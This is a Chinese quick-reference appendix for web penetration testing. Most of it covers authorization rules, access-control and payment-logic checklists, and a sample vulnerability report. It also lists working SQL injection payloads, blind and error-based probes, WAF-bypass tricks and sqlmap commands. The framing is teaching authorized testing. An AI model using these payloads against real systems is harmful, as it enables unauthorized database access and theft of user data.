# 附录：速查手册

实战时翻这一页。所有 payload 只用于**本地靶场或明确授权的目标**。

---

## 一、测试前红线

```text
[ ] 资产在授权范围内
[ ] 已读测试规则/禁止项
[ ] 不用 DoS、不爆破、不社工
[ ] 不拖库、不写文件、不反弹 shell
[ ] 不碰真实用户数据
[ ] 敏感数据打码，验证到即止
[ ] 发现高危立即报告，不扩散
```

## 四、SQL 注入速查

### 手工探测

```text
'
''
`
')
'))
' OR '1'='1
' OR 1=1-- -
' AND 1=2-- -
' UNION SELECT NULL-- -
' UNION SELECT 1,2,3-- -
```

注释：

```text
-- -    # 空格被过滤时用 --
#       # URL 中要编码为 %23
/* */   # 内联注释
```

### 盲注

```text
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
```

### 报错

```text
' AND extractvalue(1,concat(0x7e,database()))-- -
' AND updatexml(1,concat(0x7e,database()),1)-- -
```

### WAF 绕过

```text
大小写：SeLeCt
内联注释：/*!50000SELECT*/
双写：SELSELECTECT
等价：&& / || / LIKE / REGEXP
空格：/**/、%09、%0a、()
```

### sqlmap（仅本地/授权）

```bash
sqlmap -u 'http://127.0.0.1/sqli/?id=1' --batch --level=2 --risk=2 --dbs
sqlmap -r request.txt -p id --batch --technique=BEUST
```

**不要** `--dump`、`--os-shell`、`--file-write` 打真实目标。

## 十四、越权/逻辑速查

### 越权测试

```text
[ ] 准备两个同角色账号 A/B
[ ] A 的请求，换成 B 的资源 ID
[ ] A 的请求，换成 B 的 Cookie/Token
[ ] 普通用户访问管理员接口
[ ] 未登录访问需要登录的接口
[ ] 旧版本 API / 移动端 API
[ ] 导出、下载、批量接口
```

常见参数：

```text
id、uid、user_id、order_id、file_id、invoice_id
account、phone、email、tenant_id、company_id
role、is_admin、permissions、status
price、amount、quantity、discount、coupon
```

### 支付

```text
[ ] 改 price/amount/quantity
[ ] 负数、0、小数精度
[ ] 优惠券重复/叠加/越权
[ ] 回调不验签
[ ] 回调重放
[ ] 并发退款/提现
```

### 验证码/找回密码

```text
[ ] 验证码复用/不过期/可删除
[ ] 验证码在响应里
[ ] 无次数限制
[ ] 重置 token 可预测/不绑定用户
```

## 十六、HTTP 状态码

| 状态码 | 含义 | 测试时的意义 |
| --- | --- | --- |
| 200 | 成功 | 正常/越权成功 |
| 301/302 | 跳转 | 开放重定向、登录跳转 |
| 401 | 未认证 | 需要登录 |
| 403 | 禁止 | 有权限但被拒，试试绕过 |
| 404 | 不存在 | 路径猜错，或隐藏接口 |
| 405 | 方法不允许 | 换 GET/POST/PUT |
| 500 | 服务器错误 | 参数类型/注入/崩溃 |

## 十八、报告模板

```text
# [高危] 订单详情接口水平越权，可读取任意用户订单

## 一、漏洞概述
GET /api/order/{id} 只校验登录，未校验订单归属。普通用户修改 id 可读取他人订单。

## 二、影响范围
- 资产：https://shop.example.com
- 接口：GET /api/order/{id}
- 角色：普通用户
- 影响：姓名、手机号、地址、订单金额

## 三、复现步骤
1. 注册 A、B 两个账号
2. B 创建订单，ID 为 1002
3. A 登录，请求 /api/order/1002
4. 返回 B 的订单信息

## 四、请求与响应
（贴 HTTP 请求、关键响应、curl）

## 五、影响评估
可批量遍历，涉及所有用户订单，存在隐私泄露和诈骗风险。

## 六、根因分析
缺少 order.user_id == current_user.id 校验。

## 七、修复建议
1. 所有对象级接口增加归属校验
2. 无权限统一返回 404
3. 使用不可枚举 ID
4. 增加审计日志

## 八、参考资料
OWASP API Security Top 10 - API1 BOLA
```

## 二十、最后

这份速查手册不是让你"背 payload"，而是让你在实战时**少漏步骤**：

1. 先确认授权；
2. 再收集信息；
3. 按功能选漏洞；
4. 只证明，不破坏；
5. 写清楚报告。
